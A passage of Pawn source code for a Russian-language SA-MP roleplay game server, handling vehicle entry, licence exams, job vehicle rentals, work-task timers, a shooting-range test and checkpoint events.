					 	SendClientMessage(playerid,CGREY,"У Вас нет прав на вождение данного транспорта!");
					}
				}
				if(GetPVarInt(playerid,"LicMag") > 0)
				{
				    if(GetPlayerVehicleID(playerid) == GetPVarInt(playerid,"LicCar")) DeletePVar(playerid,"LicMag");
				    else
				    {
				        DeletePVar(playerid,"LicTest");
						DeletePVar(playerid,"LicTest1");
						DeletePVar(playerid,"Check");
						DeletePVar(playerid,"LicMag");
						SetVehicleToRespawn(GetPVarInt(playerid,"LicCar"));
						SendClientMessage(playerid,CREWARD,"Вы сели в другой транспорт, экзамен провален");
						DeletePVar(playerid,"LicCar");
						DisablePlayerRaceCheckpoint(playerid);
						RemovePlayerFromVehicle(playerid);
						return true;
				    }
				}
                new vehicleid = GetPlayerVehicleID(playerid);
				if(Engine[GetPlayerVehicleID(playerid)] == false)
				{
					SendClientMessage(playerid,-1,"Чтобы завести двигатель, используйте {f7ae11}2 (/en)");
					SendClientMessage(playerid,-1,"Чтобы открыть меню управления транспортом, используйте {f7ae11}/car");
				}
				if(Locked[vehicleid] == playerid) SendClientMessage(playerid,-1,"Чтобы открыть/закрыть транспорт, используйте {f7ae11}/lock");
				
				if(IsInv(vehicleid) || IsAPlane(vehicleid))
				{
					GetVehicleParamsEx(vehicleid,engine,lights,alarm,doors,bonnet,boot,objective);
					SetVehicleParamsEx(vehicleid,VEHICLE_PARAMS_ON,VEHICLE_PARAMS_ON,alarm,doors,bonnet,boot,objective);
					Engine[vehicleid] = true;
					Lights[vehicleid] = true;
				}
				if(!IsInv(vehicleid) && !IsAPlane(vehicleid))
				{
					for(new i = 0; i < 29; i++) TextDrawShowForPlayer(playerid,Speedometr[i]);
					for(new i = 0; i < 7; i++) PlayerTextDrawShow(playerid,SpeedometrP[i][playerid]);
				}
    			
				for(new v = 1; v <= TOTALVEH; v++)
				{
				    if(vehicleid != VehInfo[v][vVehicle]) continue;
					if(VehInfo[v][vFr] != PlayerInfo[playerid][pMember])
					{
					    printf("1 veh");
					    if(GetPVarInt(playerid,"LicTest1") > 0 && VehInfo[v][vFr] == F_LIC)
					    {
					        printf("2 veh");
							if(IsABike(vehicleid))
							{
								 if(GetPVarInt(playerid,"LicTest") != L_MOTO) return RemovePlayerFromVehicle(playerid);
							}
							else if(IsABus(vehicleid))
							{
								 if(GetPVarInt(playerid,"LicTest") != L_BUS) return RemovePlayerFromVehicle(playerid);
							}
							else if(IsAGruz(vehicleid))
							{
								 if(GetPVarInt(playerid,"LicTest") != L_GRUZ) return RemovePlayerFromVehicle(playerid);
							}
							else
							{
							    printf("3 veh");
							    if(GetPVarInt(playerid,"LicTest") != L_AVTO) return RemovePlayerFromVehicle(playerid);
							}
					        SetPVarInt(playerid,"LicCar",vehicleid);
					        Fuel[vehicleid] = 100;
					        SendClientMessage(playerid, CREWARD, "Двигайтесь по чекпоинтам. Если вы разобьете транспорт больше чем на половину, вы провалите тест!");
							if(VehInfo[v][vModel] == 426 || VehInfo[v][vModel] == 586) SetPlayerRaceCheckpoint(playerid, 0, LicTest[GetPVarInt(playerid,"Check")][0], LicTest[GetPVarInt(playerid,"Check")][1], LicTest[GetPVarInt(playerid,"Check")][2], LicTest[GetPVarInt(playerid,"Check")+1][0], LicTest[GetPVarInt(playerid,"Check")+1][1], LicTest[GetPVarInt(playerid,"Check")+1][2], 5);
							else
							{
							    SetPVarInt(playerid,"Check",24);
								SetPlayerRaceCheckpoint(playerid, 0, LicTest[GetPVarInt(playerid,"Check")][0], LicTest[GetPVarInt(playerid,"Check")][1], LicTest[GetPVarInt(playerid,"Check")][2], LicTest[GetPVarInt(playerid,"Check")+1][0], LicTest[GetPVarInt(playerid,"Check")+1][1], LicTest[GetPVarInt(playerid,"Check")+1][2], 5);
					        }
					        
					        break;
					    }

						SendClientMessage(playerid, CGREY, "Этот транспорт вам не доступен!");
						RemovePlayerFromVehicle(playerid);
						return true;
					}
					if(IsAGos(playerid) && PlayerInfo[playerid][pWork] == 0)
					{
						SendClientMessage(playerid,CGREY,"Начните рабочий день на базе организации");
						RemovePlayerFromVehicle(playerid);
						return 1;
					}
					if(IsAPlane(vehicleid) && PlayerInfo[playerid][pRank] < 7)
					{
						SendClientMessage(playerid,CGREY,"Данный транспорт вам недоступен (( с 7 ранга ))");
						RemovePlayerFromVehicle(playerid);
						return 1;
					}
					if(GetVehicleModel(vehicleid) == 432 && PlayerInfo[playerid][pRank] < 9)
					{
						SendClientMessage(playerid,CGREY,"Данный транспорт вам недоступен (( с 9 ранга ))");
						RemovePlayerFromVehicle(playerid);
						return 1;
					}
					break;
				}
				strmid(LastDriver[vehicleid], PlayerInfo[playerid][pSendername], 0, strlen(PlayerInfo[playerid][pSendername]), MAX_PLAYER_NAME);
				for(new v = 1; v <= TOTALV; v++)
				{
				    if(VInfo[v][vcar] == INVALID_VEHICLE_ID || vehicleid != VInfo[v][vcar]) continue;

 					if(strcmp(VInfo[v][vname],"None",true))
	 				{
	 				    
			 		    if(strcmp(VInfo[v][vname], PlayerInfo[playerid][pSendername], true) == 0) return true;
			 		    else
			 		    {
			 		        if(GetPlayerID(VInfo[v][vname]) != INVALID_PLAYER_ID && VInfo[v][vsing] == 1)
			 		        {
    							static const fmt_string1[] = "[SING] У %s сработала сингализация";
								new str[sizeof(fmt_string1)+30];
								format(str, sizeof(str), fmt_string1,VehicleNameS[GetVehicleModel(vehicleid)-400]);
			 		            SendClientMessage(GetPlayerID(VInfo[v][vname]),CREWARD,str);
			 		        }
			 		    }
			 		}
			 		else
			 		{
			 		    static const fmt_string1[] = "%s";
						new str[sizeof(fmt_string1)+30];
						format(str, sizeof(str), fmt_string1,VehicleNameS[GetVehicleModel(vehicleid)-400]);
						static const fmt_string2[] = "{FFFFFF}Цена:\t\t\t$%i\n\nВы хотите купить транспортное средство?";
						new str2[sizeof(fmt_string2)+30];
						format(str2, sizeof(str2), fmt_string2,VInfo[v][vcost]);
						ShowPlayerDialog(playerid,35,DIALOG_STYLE_MSGBOX,str,str2,"Да","Отмена");
						SetPVarInt(playerid,"CostM",VInfo[v][vcost]);
						SetPVarInt(playerid,"ModelM",v);
			 		}
			 		break;
				}
				if(vehicleid >= muscar[0] && vehicleid <= muscar[1])
				{
					if(PlayerInfo[playerid][pJob] == 7)
					{
				    	if(RentCar[vehicleid] != playerid && RentCar[vehicleid] != -1)
					    {
					        RemovePlayerFromVehicle(playerid);
					        SendClientMessage(playerid,CGREY,"Данный транспорт уже арендуют");
					    }
					    else
					    {
							if(RentCar[vehicleid] == playerid) DeletePVar(playerid,"SekBus");
							else
							{

								ShowPlayerDialog(playerid,366,DIALOG_STYLE_MSGBOX,"Аренда мусоровоза","{FFFFFF}Цена:\t\t\t$50\n\nВы хотите арендовать мусоровоз?","Да","Отмена");
							}
	                	}
                	}
                	else
					{
						RemovePlayerFromVehicle(playerid);
						SendClientMessage(playerid,CGREY,"Вы не устроены на данную работу! (Устроится можно у ближайшего бота)");
					}
				}
				if(PlayerInfo[playerid][pGrabTeam])
				{
					new band = PlayerInfo[playerid][pGrabTeam];
					if(BankGrab[band][bGrab] && BankGrab[band][bGrab] == 6)
					{
						if(BankGrab[band][bVeh] == vehicleid) 
						{
						    BankGrab[band][bGrab] = 7;
						    SetPlayerRaceCheckpoint(playerid,2,168.9625,2638.3369,17.7211,0,0,0,10);
						    SendBandMes(band,CREWARD,"Отправляйтесь утилизировать транспорт!");
							SetPVarInt(playerid,"GPS",1);
						}
					}
				}
				if(vehicleid >= washcar[0] && vehicleid <= washcar[1])
				{
					if(PlayerInfo[playerid][pJob] == 6)
					{
				    	if(RentCar[vehicleid] != playerid && RentCar[vehicleid] != -1)
					    {
					        RemovePlayerFromVehicle(playerid);
					        SendClientMessage(playerid,CGREY,"Данный транспорт уже арендуют");
					    }
					    else
					    {
							if(RentCar[vehicleid] == playerid) DeletePVar(playerid,"SekBus");
							else
							{

								ShowPlayerDialog(playerid,362,DIALOG_STYLE_MSGBOX,"Аренда машины для очистки улиц","{FFFFFF}Цена:\t\t\t$50\n\nВы хотите арендовать машину для очистки улиц?","Да","Отмена");
							}
	                	}
                	}
                	else
					{
						RemovePlayerFromVehicle(playerid);
						SendClientMessage(playerid,CGREY,"Вы не устроены на данную работу! (Устроится можно у ближайшего бота)");
					}
				}
                if(vehicleid >= rentcar[0] && vehicleid <= rentcar[1])
                {
					if(RentCar[vehicleid] == -1)
					{
    					switch(GetVehicleModel(GetPlayerVehicleID(playerid)))
						{
							case 401: SetPVarInt(playerid,"Arenda",5250);
							case 405: SetPVarInt(playerid,"Arenda",5350);
							case 421: SetPVarInt(playerid,"Arenda",5300);
							case 445: SetPVarInt(playerid,"Arenda",5250);
							case 477: SetPVarInt(playerid,"Arenda",5500);
							case 492: SetPVarInt(playerid,"Arenda",5400);
							case 561: SetPVarInt(playerid,"Arenda",5450);
							case 560: SetPVarInt(playerid,"Arenda",51000);
							case 562: SetPVarInt(playerid,"Arenda",51000);
							case 565: SetPVarInt(playerid,"Arenda",51000);
							case 579: SetPVarInt(playerid,"Arenda",5850);
							case 589: SetPVarInt(playerid,"Arenda",5550);
							case 571: SetPVarInt(playerid,"Arenda",5150);
						}
						static const fmt_string1[] = "%s";
						new str[sizeof(fmt_string1)+30];
						format(str, sizeof(str), fmt_string1,VehicleNameS[GetVehicleModel(vehicleid)-400]);
						static const fmt_string2[] = "{FFFFFF}Цена:\t\t\t$%i\n\nВы хотите арендовать машину?";
						new str2[sizeof(fmt_string2)+5-2];
						format(str2, sizeof(str2), fmt_string2,GetPVarInt(playerid,"Arenda"));
	                    ShowPlayerDialog(playerid,248,DIALOG_STYLE_MSGBOX,str,str2,"Да","Отмена");
                    }
                    else
                    {
                        if(RentCar[vehicleid] != playerid)
                        {
                            RemovePlayerFromVehicle(playerid);
      						SendClientMessage(playerid,CGREY,"Данный транспорт уже арендуют");
                        }
                    }
                }
                
  				for(new i = 1; i <= TOTALCJ; i++)
				{
				    if(vehicleid != CarJob[i][jcar]) continue;
				    if(PlayerInfo[playerid][pJob] == CarJob[i][jbiz])
				    {
					    if(RentCar[vehicleid] != playerid && RentCar[vehicleid] != -1)
					    {
					        RemovePlayerFromVehicle(playerid);
					        SendClientMessage(playerid,CGREY,"Данный транспорт уже арендуют");
					    }
					    else
					    {
							SetPVarInt(playerid,"CarPl",i);
						    if(CarJob[i][jidcar] == 437 || CarJob[i][jidcar] == 431)
						    {
	         					if(RentCar[vehicleid] == playerid)
								{
				    				switch(GetPVarInt(playerid,"Mar"))
								    {
										case 1: SetPlayerRaceCheckpoint(playerid, 0, Gorodskoy1[GetPVarInt(playerid,"Check")][0], Gorodskoy1[GetPVarInt(playerid,"Check")][1], Gorodskoy1[GetPVarInt(playerid,"Check")][2], Gorodskoy1[GetPVarInt(playerid,"Check")+1][0], Gorodskoy1[GetPVarInt(playerid,"Check")+1][1], Gorodskoy1[GetPVarInt(playerid,"Check")+1][2], 5);
								        case 2: SetPlayerRaceCheckpoint(playerid, 0, Gorodskoy2[GetPVarInt(playerid,"Check")][0], Gorodskoy2[GetPVarInt(playerid,"Check")][1], Gorodskoy2[GetPVarInt(playerid,"Check")][2], Gorodskoy2[GetPVarInt(playerid,"Check")+1][0], Gorodskoy2[GetPVarInt(playerid,"Check")+1][1], Gorodskoy2[GetPVarInt(playerid,"Check")+1][2], 5);
								        case 3: SetPlayerRaceCheckpoint(playerid, 0, Gorodskoy3[GetPVarInt(playerid,"Check")][0], Gorodskoy3[GetPVarInt(playerid,"Check")][1], Gorodskoy3[GetPVarInt(playerid,"Check")][2], Gorodskoy3[GetPVarInt(playerid,"Check")+1][0], Gorodskoy3[GetPVarInt(playerid,"Check")+1][1], Gorodskoy3[GetPVarInt(playerid,"Check")+1][2], 5);
								        //case 4: SetPlayerRaceCheckpoint(playerid, 0, Gorodskoy4[GetPVarInt(playerid,"Check")][0], Gorodskoy4[GetPVarInt(playerid,"Check")][1], Gorodskoy4[GetPVarInt(playerid,"Check")][2], Gorodskoy4[GetPVarInt(playerid,"Check")][3], Gorodskoy4[GetPVarInt(playerid,"Check")][4], Gorodskoy4[GetPVarInt(playerid,"Check")][5], 5);
								        //case 5: SetPlayerRaceCheckpoint(playerid, 0, Gorodskoy5[GetPVarInt(playerid,"Check")][0], Gorodskoy5[GetPVarInt(playerid,"Check")][1], Gorodskoy5[GetPVarInt(playerid,"Check")][2], Gorodskoy5[GetPVarInt(playerid,"Check")][3], Gorodskoy5[GetPVarInt(playerid,"Check")][4], Gorodskoy5[GetPVarInt(playerid,"Check")][5], 5);
									}
									DeletePVar(playerid,"SekBus");
								}
								else
								{
		
									ShowPlayerDialog(playerid,55,DIALOG_STYLE_MSGBOX,"Аренда автобусов","{FFFFFF}Цена:\t\t\t$50\n\nВы хотите арендовать автобус?","Да","Отмена");
								}
							}
							if(CarJob[i][jidcar] == 514)
							{
	      						if(RentCar[vehicleid] == playerid) DeletePVar(playerid,"SekBus");
								else
								{

									ShowPlayerDialog(playerid,456,DIALOG_STYLE_MSGBOX,"Аренда машины дальнобойщиков","{FFFFFF}Цена:\t\t\t$50\n\nВы хотите арендовать машину дальнобойщиков?","Да","Отмена");
									SetPVarInt(playerid,"DCena",50);
								}
							}
							if(CarJob[i][jidcar] == 403)
							{
	      						if(RentCar[vehicleid] == playerid) DeletePVar(playerid,"SekBus");
								else
								{

									ShowPlayerDialog(playerid,456,DIALOG_STYLE_MSGBOX,"Аренда машины дальнобойщиков","{FFFFFF}Цена:\t\t\t$75\n\nВы хотите арендовать машину дальнобойщиков?","Да","Отмена");
									SetPVarInt(playerid,"DCena",75);
								}
							}
							if(CarJob[i][jidcar] == 515)
							{
	      						if(RentCar[vehicleid] == playerid) DeletePVar(playerid,"SekBus");
								else
								{

									ShowPlayerDialog(playerid,456,DIALOG_STYLE_MSGBOX,"Аренда машины дальнобойщиков","{FFFFFF}Цена:\t\t\t$90\n\nВы хотите арендовать машину дальнобойщиков?","Да","Отмена");
									SetPVarInt(playerid,"DCena",90);
								}
							}
							if(CarJob[i][jidcar] == 414 || CarJob[i][jidcar] == 456 || CarJob[i][jidcar] == 459)
							{
	      						if(RentCar[vehicleid] == playerid) DeletePVar(playerid,"SekBus");
								else
								{
		
									ShowPlayerDialog(playerid,69,DIALOG_STYLE_MSGBOX,"Аренда машины для развозки продуктов","{FFFFFF}Цена:\t\t\t$50\n\nВы хотите арендовать машину для развозки продуктов?","Да","Отмена");
								}
							}
							if(CarJob[i][jidcar] == 420 || CarJob[i][jidcar] == 438)
							{
	      						if(RentCar[vehicleid] == playerid) DeletePVar(playerid,"SekBus");
								else
								{
			
									ShowPlayerDialog(playerid,57,DIALOG_STYLE_MSGBOX,"Аренда такси","{FFFFFF}Цена:\t\t\t$50\n\nВы хотите арендовать такси?","Да","Отмена");
								}
							}
							if(CarJob[i][jidcar] == 525)
							{
	      						if(RentCar[vehicleid] == playerid) DeletePVar(playerid,"SekBus");
								else
								{

									ShowPlayerDialog(playerid,60,DIALOG_STYLE_MSGBOX,"Аренда машины механиков","{FFFFFF}Цена:\t\t\t$50\n\nВы хотите арендовать машину мехников?","Да","Отмена");
								}
							}
							
						}
					}
					else
					{
						RemovePlayerFromVehicle(playerid);
						SendClientMessage(playerid,CGREY,"Вы не устроены на данную работу! (Устроится можно у ближайшего бота)");
					}
					break;
				}
			}
	}
	return 1;
}

function SheTime(playerid)
{
    TogglePlayerControllable(playerid, 1);
    SetPlayerSpecialAction(playerid,25);
    DestroyDynamicObject(GetPVarInt(playerid,"ShveObject"));
    DeletePVar(playerid,"ShveObject");
    SendClientMessage(playerid,CGREEN,"Отнесите упакованный товар на склад");
    SetPVarInt(playerid,"ShveW",4);
	SetPlayerCheckpoint(playerid,2851.5515,-1202.6520,1027.8796, 1.0);
	SetPlayerAttachedObject(playerid, 5, 2694, 1, 0.084999, 0.366999, -0.006000, 0.000000, 90.799995, -83.000007, 1.000000, 1.00, 1.000000);
	SetTimerEx("ClearAnim", 300, 0, "d", playerid);
}
function PovarTime(playerid)
{
    TogglePlayerControllable(playerid, 1);
    DestroyDynamicObject(GetPVarInt(playerid,"PovarObject"));
    DeletePVar(playerid,"PovarObject");
    SendClientMessage(playerid,CGREEN,"Блюдо готово, несите на раздачу");
    SetPVarInt(playerid,"PovarW",5);
	SetPlayerCheckpoint(playerid,1393.1699,-32.7484,1000.9299, 1.0);
	SetTimerEx("ClearAnim", 300, 0, "d", playerid);
	switch(GetPVarInt(playerid,"PovarEda"))
    {
		case 1: SetPlayerAttachedObject(playerid, 1, 19571, 1, 0.097999, 0.417999, -0.226999, 0.000000, 0.000000, 91.400009, 1.000000, 1.00, 1.000000),SetPlayerSpecialAction(playerid,25);
		case 2: SetPlayerAttachedObject(playerid, 1, 2663, 5, 0.305999, -0.001999, -0.037999, 0.000000, -80.200004, 60.899997, 1.000000, 1.00, 1.000000);
		case 3: SetPlayerAttachedObject(playerid, 1, 2663, 5, 0.305999, -0.001999, -0.037999, 0.000000, -80.200004, 60.899997, 1.000000, 1.00, 1.000000);
    }
}
forward PesokTimer(playerid);
public PesokTimer(playerid)
{
    ClearAnim(playerid);
    if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
    SetPlayerAttachedObject(playerid, 1, 2060, 1, 0.164999, 0.424000, 0.000000, 0.000000, 91.100051, 0.000000, 1.000000, 1.00, 1.000000);
    SetPlayerCheckpoint(playerid,-1311.3838,2689.3892,50.0625, 3.0);
    SetPlayerSpecialAction(playerid,25);
    SendClientMessage(playerid,CGREEN,"Отнесите мешок на конвейер");
    SetPVarInt(playerid,"PesW",2);
	return 1;
}
stock ExitTir(playerid)
{
	DeletePVar(playerid,"AshPos");
	DeletePVar(playerid,"AshCheckGun");
	DeletePVar(playerid,"AshCheck");
	DeletePVar(playerid,"BadAsh");
	ResetPlayerWeapons(playerid);
	for(new i = 0; i < 7; i ++)
    {
        if(!IsValidDynamicObject(ListNick[playerid][i])) continue;
        DestroyDynamicObject(ListNick[playerid][i]);
    }
    return 1;
}
stock UpdatePlane()
{
	new str[50];
	format(str,sizeof(str),"Товар: {f7ae11}%d/20 ящиков",PlaneSklad);
	Update3DTextLabelTextEx(PlaneText,-1,str);
	return 1;
}
public OnDynamicObjectMoved(objectid)
{
    new Float:x,Float:y,Float:z;
	if(PlaneStatus)
	{
	    if(objectid == PlaneObj)
	    {
	        GetDynamicObjectPos(objectid, x, y, z);
	        switch(PlaneStatus)
	        {
	            case 1:
	            {
	                if(x == -31.44197 && y == 2502.98730 && z == 17.65790 && PlaneMap == 2)
			        {
			            MoveDynamicObject(objectid,331.35229, 2502.98730, 17.65790,15);
			            PlaneStatus++;
			        }
			        if(x == 1476.54443 && y == 1811.52039 && z == 11.95570 && PlaneMap == 1)
			        {
			            MoveDynamicObject(objectid,1476.54443, 1507.73376, 11.95570,15);
			            PlaneStatus++;
			        }
			        // 1476.54443, 1811.52039, 11.95570 приземл
	  // 1476.54443, 1507.73376, 11.95570 стоп
			        if(x == 1453.75598 && y == -2593.06299 && z ==  14.69940 && PlaneMap == 0)
			        {
			            MoveDynamicObject(objectid,1688.27087, -2593.06299, 14.69940,15);
			            PlaneStatus++;
			        }
			         
	            }
	            case 2:
	            {
	                if((x == 331.35229 && y == 2502.98730 && z == 17.65790  && PlaneMap == 2) ||
					(x == 1476.54443 && y ==  1507.73376 && z ==  11.95570  && PlaneMap == 1) ||
					(x == 1453.75598 && y ==  -2593.06299 && z ==  14.69940  && PlaneMap == 0))
			        {
			            PlaneStatus++;
						switch(PlaneMap)
						{
						    case 2: PlaneText = Create3DTextLabelEx( "-",0xC2C2C220,331.35229, 2502.98730, 17.65790+3,10.0, 0, 0 );
						    case 1: PlaneText = Create3DTextLabelEx( "-",0xC2C2C220,1476.54443, 1507.73376, 11.95570+3,10.0, 0, 0 );
						    case 0: PlaneText = Create3DTextLabelEx( "-",0xC2C2C220,1688.27087, -2593.06299, 14.69940+3,10.0, 0, 0 );
						}
			            UpdatePlane();
			            SetTimer("PlaneDelete",300000,false);
			        }
	            }
	            case 4:
	            {
	                new Float:rz;
	        		GetDynamicObjectRot(objectid, rz, rz, rz);
	                if(rz == 90  && PlaneMap == 2)
			        {
			            MoveDynamicObject(PlaneObj,-31.44197, 2502.98730, 17.65790,15);
			            PlaneStatus++;
			        }
			        if(rz == 0  && PlaneMap == 1)
			        {
			            MoveDynamicObject(PlaneObj,1476.54443, 1811.52039, 11.95570,15);
			            PlaneStatus++;
			        }
			        if(rz == 90  && PlaneMap == 0)
			        {
			            MoveDynamicObject(PlaneObj,1453.75598,-2593.06299,14.69940,15);
			            PlaneStatus++;
			        }
	            }
	            case 5:
	            {
	                if(x == -31.44197 && y == 2502.98730 && z == 17.6579  && PlaneMap == 2)
			        {
			            MoveDynamicObject(objectid, -309.7981, 2506.35254, 252.15901,15);
			            PlaneStatus = 0;
			            DestroyDynamicObject(objectid);
			        }
			        if(x == 1476.54443 && y == 1507.73376 && z == 11.95570 && PlaneMap == 1)
			        {
			            MoveDynamicObject(objectid, 1477.04358, 2019.12695, 252.15901,15);
			            PlaneStatus = 0;
			            DestroyDynamicObject(objectid);
			        }
			        if(x == 1453.75598 && y == -2593.06299 && z == 14.69940 && PlaneMap == 0)
			        {
			            MoveDynamicObject(objectid, 1254.79810, -2593.06299,  252.15901,15);
			            PlaneStatus = 0;
			            DestroyDynamicObject(objectid);
			        }
	            }
	        }
	        
	        
	        
	        
	    }
	}
    if(Streamer_IsInArrayData(STREAMER_TYPE_OBJECT, objectid, E_STREAMER_EXTRA_ID, -2))
    {
        //printf("object yes %d %d");
        static data[3];
		static player = INVALID_PLAYER_ID;
		static id__object;
		Streamer_GetArrayData(STREAMER_TYPE_OBJECT, objectid, E_STREAMER_EXTRA_ID, data);
		player = data[1];
		
		id__object = data[2];
	//	printf("object yes %d %d",player,id__object);
		if(GetPVarInt(player,"AshCheck"))
		{
		    GetDynamicObjectPos(objectid, x, y, z);
		    if(x == 1383.6162)
		    {
		        GameTextForPlayer(player, "~r~BAD", 300, 6);
		        //SetDynamicObjectPos(tirobj[GetPVarInt(player,"AshPos")],tirpos[GetPVarInt(player,"AshPos")][0],tirpos[GetPVarInt(player,"AshPos")][1],tirpos[GetPVarInt(player,"AshPos")][2]);
			    DeletePVar(player,"AshCheckGun");
			    
			    if(GetPVarInt(player,"BadAsh") < 3)
				{
				    for(new i = 0; i < 7; i ++)
				    {
				        if(!IsValidDynamicObject(ListNick[player][i])) continue;
				        DestroyDynamicObject(ListNick[player][i]);
				    }
					switch(GetPVarInt(player,"AshPos"))
					{
					    case 0: CreateRange(player,1373.4355, -18.6052, 1004.2263,90.0,2,1,1383.6162,-18.6052,0.5);
						case 1: CreateRange(player,1373.4355, -14.9871, 1004.2263,90.0,2,1,1383.6162,-14.9871,0.5);
						case 2: CreateRange(player,1373.4258, -11.4161, 1004.2263,90.0,2,1,1383.6162,-11.4161,0.5);
					}
					SetPVarInt(player,"BadAsh",GetPVarInt(player,"BadAsh")+1);
				}
				else
				{
				    SendClientMessage(player,CREWARD,"Вы провалили тестирование!");
				    DeletePVar(player,"GoLic");
				    ExitTir(player);
				}
		    }
		}
		if(GetPVarInt(player,"Tir"))
		{
		    if(GetPVarInt(player,"short__shop") == 0)
			{
			    printf("object del %d %d",player,id__object);
				Streamer_RemoveArrayData(STREAMER_TYPE_OBJECT, objectid, E_STREAMER_EXTRA_ID, -2);
				Streamer_RemoveArrayData(STREAMER_TYPE_OBJECT, objectid, E_STREAMER_EXTRA_ID, player);
				Streamer_RemoveArrayData(STREAMER_TYPE_OBJECT, objectid, E_STREAMER_EXTRA_ID, id__object);
				DestroyDynamicObject(objectid);
			}
			else
			{
			    printf("object move %d %d",player,id__object);
				
				GetDynamicObjectPos(objectid, x, y, z);
				if(id__object == 1)
				{
				    printf("1 object move %d %d",player,id__object);
				    if((x == 309.94650) && (y == -70.87310))
					{
					    MoveDynamicObject(objectid, 309.94650, -57.21810, 1000.51208, levelammo[player]);
					}
					else
					{
					    MoveDynamicObject(objectid,  309.94650, -70.87310, 1000.51208, levelammo[player]);
					}
				}
				else
				{
				    printf("2 object move %d %d",player,id__object);
				    if((x ==  312.59149) && (y == -57.24220))
					{
					    MoveDynamicObject(objectid, 312.59146, -70.85304, 1000.51208, levelammo[player]);
					}
					else
					{
					    MoveDynamicObject(objectid, 312.59149, -57.24220, 1000.51208, levelammo[player]);
					}
				}
			}
		}
		else
		{
			if(GetPVarInt(player,"Pes") == 0)
			{
				Streamer_RemoveArrayData(STREAMER_TYPE_OBJECT, objectid, E_STREAMER_EXTRA_ID, -2);
				Streamer_RemoveArrayData(STREAMER_TYPE_OBJECT, objectid, E_STREAMER_EXTRA_ID, player);
				Streamer_RemoveArrayData(STREAMER_TYPE_OBJECT, objectid, E_STREAMER_EXTRA_ID, id__object);
				DestroyDynamicObject(objectid);
			}
			if(GetPVarInt(player,"Povar") == 0)
			{
				Streamer_RemoveArrayData(STREAMER_TYPE_OBJECT, objectid, E_STREAMER_EXTRA_ID, -2);
				Streamer_RemoveArrayData(STREAMER_TYPE_OBJECT, objectid, E_STREAMER_EXTRA_ID, player);
				Streamer_RemoveArrayData(STREAMER_TYPE_OBJECT, objectid, E_STREAMER_EXTRA_ID, id__object);
				DestroyDynamicObject(objectid);
			}
			else
			{
				
				GetDynamicObjectPos(objectid, x, y, z);
				if((x == -1282.88025 && y == 2705.12695) || x == 1385.13)
				{
				    Streamer_RemoveArrayData(STREAMER_TYPE_OBJECT, objectid, E_STREAMER_EXTRA_ID, -2);
					Streamer_RemoveArrayData(STREAMER_TYPE_OBJECT, objectid, E_STREAMER_EXTRA_ID, player);
					Streamer_RemoveArrayData(STREAMER_TYPE_OBJECT, objectid, E_STREAMER_EXTRA_ID, id__object);
					DestroyDynamicObject(objectid);
				}
			}
		}
		
    }
	return 1;
}
/*forward MusorUp(playerid);
public MusorUp(playerid)
{
    DisablePlayerRaceCheckpoint(playerid);
    TogglePlayerControllable(playerid, 1);
    new i = GetPVarInt(playerid,"Check");
	if(MusorCount[i] >= 50) MusorCount[i] -= 50;
	else MusorCount[i] = 0;
	new string[40];
	format(string, sizeof(string), "Мусор: {f7ae11}%d/100%", MusorCount[i]);
	UpdateDynamic3DTextLabelText(MusorText[i], -1, string);
    BInfo[GetPlayerVehicleID(playerid)][bWork] += 10;
    new str[50];
	format(str,sizeof(str),"Загруженно: {f7ae11}%d/100%",BInfo[GetPVarInt(playerid,"Bus")][bWork]);
	UpdateDynamic3DTextLabelText(CarLable[GetPlayerVehicleID(playerid)],-1,str);
	if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
	if(BInfo[GetPVarInt(playerid,"Bus")][bWork] < 100)
	{
	    SendClientMessage(playerid,CGREEN,"Отправляйтесь к следующему мусорному контейнеру!");
	    SetPVarInt(playerid,"Check",GetPVarInt(playerid,"Check")+1);
	    new rand = GetMusor(playerid);
		SetPVarInt(playerid,"Check",rand);
		SetPlayerRaceCheckpoint(playerid, 1, MusorPos[rand][0], MusorPos[rand][1], MusorPos[rand][2], 0.0,0.0,0.0, 5);
	}
	else
	{
	    SendClientMessage(playerid,CGREEN,"Транспорт загружен! Отправляйтесь на место разгрузки");
	    SetPlayerRaceCheckpoint(playerid, 1, 64.8071,-289.0333,2.1295, 0.0,0.0,0.0, 5);
	}
	return 1;
}*/
stock GetMusor(playerid)
{
	new rand = -1;
	new x = (GetPVarInt(playerid,"GorodCh") == 1)  ? (143) : (177);
	for(new i = GetPVarInt(playerid,"Check"); i < x; i++)
	{
		if(!MusorCount[i]) continue;
		rand = i;
		break;
	}
	return rand;
}





forward TimerCheckPoint(playerid,Float:x,Float:y,Float:z,Float:size);
public TimerCheckPoint(playerid,Float:x,Float:y,Float:z,Float:size) return SetPlayerCheckpoint(playerid,x,y,z,size);
public OnPlayerEnterCheckpoint(playerid)
{
	new obj,slot;
	if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return true;
	if(GetPVarInt(playerid,"MedicW") == 3 && GetPVarInt(playerid,"Medic"))
	{
	    DisablePlayerCheckpoint(playerid);
	    HosAp1++;
		SetMatsInt("HosAp1",HosAp1);
		SetTimer("UpdAp1",300,false);
	    SetPVarInt(playerid,"MedicW",1);
		SetPVarInt(playerid,"MedicC",GetPVarInt(playerid,"MedicC")+1);
		static const fmt_string2[] = "Вы успешно собрали аптечку. Ваш общий заработок: $%d";
		new str2[sizeof(fmt_string2)+5];
		format(str2, sizeof(str2), fmt_string2,GetPVarInt(playerid,"MedicC")*2);
		SendClientMessage(playerid,CREWARD,str2);
		if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
		if(PlayerInfo[playerid][pQuest] == 1) PlayerInfo[playerid][pQ][1]++;
	}
	if(GetPVarInt(playerid,"ArmyW") == 2)
	{
	    if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
	    ApplyAnimation(playerid, "CARRY", "PUTDWN", 4.1, 0, 0, 0, 0, 0,1);
	    SetPlayerSpecialAction(playerid,0);
	    DisablePlayerCheckpoint(playerid);
	    DeletePVar(playerid,"ArmyW");
	    FracMats[F_ARMY] += 70;
	    SetMatsInt("armysamats",FracMats[F_ARMY]);
	    UpdateArmy();
		static const fmt_string2[] = "Вы положили 70 материалов на склад. На складе: %i материалов";
		new str2[sizeof(fmt_string2)+5-2];
		format(str2, sizeof(str2), fmt_string2,FracMats[F_ARMY]);
	    SendClientMessage(playerid,CGREEN,str2);
	    SetPlayerRaceCheckpoint(playerid,2,2181.2771,1578.8796,999.9712,0,0,0,1); //mayor
		SetPVarInt(playerid,"GPS",1);
